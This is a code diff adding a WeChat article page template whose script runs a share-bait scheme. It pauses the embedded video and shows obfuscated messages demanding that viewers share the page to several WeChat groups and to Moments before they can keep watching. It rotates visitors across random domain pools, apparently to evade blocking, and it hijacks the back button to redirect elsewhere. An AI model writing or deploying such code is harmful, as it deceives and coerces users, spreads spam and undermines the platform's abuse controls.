@@ -1,0 +1,256 @@
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
+	<link href="{STATIC_URL}css/show_gzh.css" rel="stylesheet">
+	<link href="//cdn.bootcss.com/weui/0.4.3/style/weui.min.css" rel="stylesheet">
+	<script src="http://res.wx.qq.com/open/js/jweixin-1.4.0.js"></script>
+	<script src="{STATIC_URL}js/jquery-1.8.2.min.js"></script>
+	<script src="{STATIC_URL}js/qifan.js"></script>
+	<script src="http://imgcache.qq.com/tencentvideo_v1/tvp/js/tvp.player_v2_jq.js" type="text/javascript" ></script>
+	<title>{if $gzhname}{$gzhname}{else}{$title}{/if}</title>
+</head>
+<body id="activity-detail" class="zh_CN mm_appmsg appmsg_skin_default appmsg_style_default rich_media_empty_extra">
+<link rel="dns-prefetch" href="//res.wx.qq.com">
+<link rel="dns-prefetch" href="//mmbiz.qpic.cn">
+<link rel="shortcut icon" type="image/x-icon" href="//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/icon/common/faviconsharenumsharenumc41b.ico">
+<div id="js_article" class="rich_media">
+    <div id="js_top_ad_area" class="top_banner"></div>
+    <div class="rich_media_inner">
+        <div id="page-content" class="rich_media_area_primary">
+			<div class="rich_media_area_primary_inner">
+				<div id="img-content">
+					<hsharenum class="rich_media_title" id="activity-name"> 
+						{$title}
+					</hsharenum>
+					<div id="meta_content" class="rich_media_meta_list">
+						<span class="rich_media_meta rich_media_meta_text">{$nickname}</span>
+						<span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
+							<a href="{$gzhurl}" id="js_name">{$gzhname}</a>
+						</span>
+						<em id="publish_time" class="rich_media_meta rich_media_meta_text">{date("n",$inputtime)}月{date("j",$inputtime)}日</em>
+					</div>
+					{if $videofile}<div class="page-con"><video src="{$videofile}"></video></div>{/if}
+					{if $vid}<div id="mod_play"></div>{/if}
+					<div class="page-con">{$content}</div>
+				</div>
+			</div>
+			<div class="page-bottom">
+				{if $quanwenurl}<span class="page-all"><a href="{$quanwenurl}">阅读全文</a></span>&nbsp;&nbsp;&nbsp;&nbsp;{/if}
+				<span class="page-du">阅读&nbsp;<span class="page-click">{$click}<span>&nbsp;</span>
+				<span class="page-zan">
+					<img class="down" src="{STATIC_URL}images/thum_down.png" style="height:16px">
+					<img class="up" src="{STATIC_URL}images/thum_up.png" style="height:16px;display:none;">
+					<span id="dianzan">{$dianzan}</span>
+				</span>
+			</div>
+			<div class="page-ad">
+				<span class="page-ad-t">
+					<span class="page-l">--------------------------------------------------------------------------------</span>
+					<span class="page-c">广告∨</span>
+					<span class="page-r">--------------------------------------------------------------------------------</span>
+				</span>
+				<span class="page-d"><a href="http://code.yianju.ltd/qifanart/pubilc/tousu/">投诉</a></span>
+				<span class="page-ad-d"><a href="{$adurl}"><img src="{$adimg}" /></a></span>
+			</div>
+		</div>
+	</div>
+</div>
+<div id="zhezhao_share" class="share-a">
+    <img src="{STATIC_URL}images/fxq.png" id="share-wx-img" style="width: 100%; padding-right: 15px;">
+</div>
+<div class="weui_dialog_alert" id="dialog_alert" style="display:none;color:#000000">
+	<div class="weui_mask"></div>
+	   <div class="weui_dialog">
+		   <div class="weui_dialog_hd"><strong class="weui_dialog_title">温馨提示</strong></div>
+		   <div class="weui_dialog_bd" id="dialog_alert_Mes" style="color:#000000"></div>
+		   <div class="weui_dialog_ft">
+			   <a onclick="dialog_alert_Hide();" id="okBtn" class="weui_btn_dialog primary">好</a>
+		   </div>
+	   </div>
+	</div>
+</div>
+<script>
+	wx.config({
+		debug: false, 
+		appId:'{$appid}', 
+		urls:'{$url}',
+		timestamp:{$timestamp},
+		nonceStr:'{$noncestr}',
+		signature:'{$signature}',
+		jsApiList:['onMenuShareTimeline', 'onMenuShareAppMessage', 'hideAllNonBaseMenuItem', 'showMenuItems']
+	});
+	var num = 0;
+	var sharenum = {$sharenum};
+	wx.ready(function(){
+			wx.hideAllNonBaseMenuItem();
+		});
+	function in_array(domain, domainarr) {//数组内是否包含
+		for (s = 0; s < domainarr.length; s++) {
+			thisEntry = domainarr[s].toString();
+			if (thisEntry == domain) {
+			return true;
+			}
+		}
+		return false;
+	};
+	var safelink = '{$path}';//入口目录
+	var domains = '{$domains}';//域名池
+	var ddomains = '{$ddomain}';//落地域名
+	var okurl = '{$okurl}';//成功
+	var backurl = '{$backurl}';//返回
+	var xdomain = window.location.protocol+"//"+window.location.host;//现访问域名含http://协议
+	var domain = safelink.split('/')[0]+'//'+safelink.split('/')[2];//入口域名
+	var cdomain = domains.split(',');//域名池数组
+	var mdomain = cdomain[parseInt(Math.random()*cdomain.length)];//随机域名池
+	var ddomain = ddomains.split(',');//落地数组
+	var ndomain = ddomain[parseInt(Math.random()*ddomain.length)];//随机落地
+
+	if(xdomain == domain){//入口时到域名池
+		window.location.href=window.location.href.replace(xdomain,mdomain);
+	}else if(in_array(xdomain,cdomain)){
+		document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {WeixinJSBridge.call('hideOptionMenu');});
+	}else if(in_array(xdomain,ddomain)){
+		if(window.location.href.indexOf('ok') < 0){
+			show_tip();
+		};
+	};
+	if(okurl ==''){
+		okurl = window.location.href.split('?')[0].replace(xdomain,mdomain) + '?ok';
+	};
+	pushHistory();
+	function pushHistory() {
+	var state = {
+		title: "title",
+		url: "#"    };
+	window.history.pushState(state, "title", "#");
+	};
+	window.onpopstate = function(){
+		location.href= backurl;
+	};
+	var imgurl = '{$thumb}';
+	if(imgurl.indexOf('http') < 0){
+		imgurl = domain +'{$thumb}';
+	};
+	function dialog_alert_Hide(){
+		$("#dialog_alert").hide();
+	}
+	function dialog_alert_Mes(mes){
+		$("#dialog_alert").show();
+		$("#dialog_alert_Mes").html(mes);
+	}
+	function show_tip(){
+		SDV();
+		dialog_alert_Mes(unescape('%u628A%u597D%u4E1C%u897F%u5206%u4EAB%u7ED9%u60A8%u7684%u670B%u53CB%u5427%uFF01%u53D1%u9001%u5230%u5FAE%u4FE1%u7FA4%u5373%u53EF%u7EE7%u7EED%u89C2%u770B%uFF01'));
+	}
+	function HDV(){
+		$("#zhezhao_share").hide();
+	}
+	function SDV(){
+		$("#zhezhao_share").show();
+		var num = 0;
+		var sharenum = {$sharenum};
+		wx.ready(function(){
+				wx.hideAllNonBaseMenuItem();
+				wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+				wx.onMenuShareAppMessage({
+					title: '{$sharetitle}',
+					link: window.location.href.replace(xdomain,domain).split('?')[0],
+					imgUrl:imgurl,
+					desc: '{$sharedesc}',
+					success: function(res) {
+						setTimeout(function(){
+							var	str = res.errMsg;
+							if(str.indexOf("ok")>-1){
+								num++;
+								if(num >= sharenum){
+									wx.hideAllNonBaseMenuItem();
+									wx.showMenuItems({menuList: ['menuItem:share:timeline']});
+									dialog_alert_Mes(unescape('%u5206%u4EAB%u6210%u529F%uFF0C%u5269%u4E0B%u6700%u540E%u4E00%u6B65%u5566%uFF01%u8BF7%u5206%u4EAB%u5230%3Cspan%20style%3D%22font-size%3A%2030px%3Bcolor%3A%20%23f5294c%22%3E%u670B%u53CB%u5708%3C/span%3E%u5373%u53EF%u89C2%u770B%uFF01'));
+								}else{
+									wx.hideAllNonBaseMenuItem();
+									wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+									dialog_alert_Mes(unescape('%u5206%u4EAB%u6210%u529F%uFF0C%u8FD8%u9700%u5206%u4EAB%3Cspan%20style%3D%22font-size%3A%2030px%3Bcolor%3A%20%23f5294c%22%3E') + (sharenum - num) + unescape('%3C/span%3E%u4E2A%u4E0D%u540C%u7684%u5FAE%u4FE1%u7FA4%u5373%u53EF%u89C2%u770B%uFF08%u5206%u4EAB%u76F8%u540C%u7FA4%u65E0%u6548%uFF09'));
+								}
+							}else{
+								wx.hideAllNonBaseMenuItem();
+								wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+								dialog_alert_Mes(unescape('%u5206%u4EAB%u6210%u529F%uFF0C%u8FD8%u9700%u5206%u4EAB%3Cspan%20style%3D%22font-size%3A%2030px%3Bcolor%3A%20%23f5294c%22%3E') + (sharenum - num) + unescape('%3C/span%3E%u4E2A%u4E0D%u540C%u7684%u5FAE%u4FE1%u7FA4%u5373%u53EF%u89C2%u770B%uFF08%u5206%u4EAB%u76F8%u540C%u7FA4%u65E0%u6548%uFF09'));
+							}
+						}, 500);
+					}
+				});
+				wx.onMenuShareTimeline({
+					title: '{$quntitle}',
+					link: window.location.href.replace(xdomain,domain).split('?')[0],
+					imgUrl:imgurl,
+					desc: '{$sharedesc}',
+					success: function(res) {
+						setTimeout(function(){
+							window.location.href= okurl;
+						}, 500);
+					}
+				});
+			});
+	}
+</script>
+{if $vid}
+<script>
+	//腾讯视频
+	var vid = "{$vid}";
+	var width = $(".play_b").width();
+	var sharetime = {$sharetime};
+	var video = new tvp.VideoInfo();
+	video.setVid(vid);
+	if(window.location.href.indexOf('ok') > 0){
+		video.setHistoryStart(sharetime);
+	}
+	var player =new tvp.Player();
+	var start = true;
+	setInterval(function(){
+		var currentTime = player.getPlaytime();
+		if(currentTime >= sharetime) {
+			if($("#zhezhao_share").is(":hidden") && window.location.href.indexOf('ok') < 0){
+				player.pause();
+				if(!in_array(xdomain,ddomain)){//现域名!=落地域名时
+					window.location.href=window.location.href.replace(xdomain,ndomain);
+				};
+			}
+		};
+	},1000);
+	player.create({
+		width:width,
+		height:240,
+		video:video,
+		modId:"mod_play",
+		autoplay:true
+	});
+</script>
+{/if}
+{if $videofile}
+<script>
+	//视频文件或地址
+	if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
+		$('.page-con video').attr({'id':'video','preload':'auto','webkit-playsinline':'true','x5-video-player-fullscreen':'true','x-webkit-airplay':'allow','x5-video-player-type':'h5','x5-video-orientation':'portraint','playsinline':'true','controls':'controls'});
+	} else if (/(Android)/i.test(navigator.userAgent)) {
+		$('.page-con video').attr({'id':'video','preload':'auto','webkit-playsinline':'true','controls':'controls'});
+	} else {
+	};
+	var player = document.getElementById("video");
+	var shareTime = {$sharetime};
+	if(window.location.href.indexOf('ok') > 0){
+		player.currentTime = shareTime;
+	}
+	player.ontimeupdate = function() {
+		if(player.currentTime >= shareTime && window.location.href.indexOf('ok') < 0){
+			player.pause();
+			if(!in_array(xdomain,ddomain)){//现域名!=落地域名时
+				window.location.href=window.location.href.replace(xdomain,ndomain);
+			};
+		}
+	}
+</script>
+{/if}
+{$site['site_code']}
+</body>
+</html>
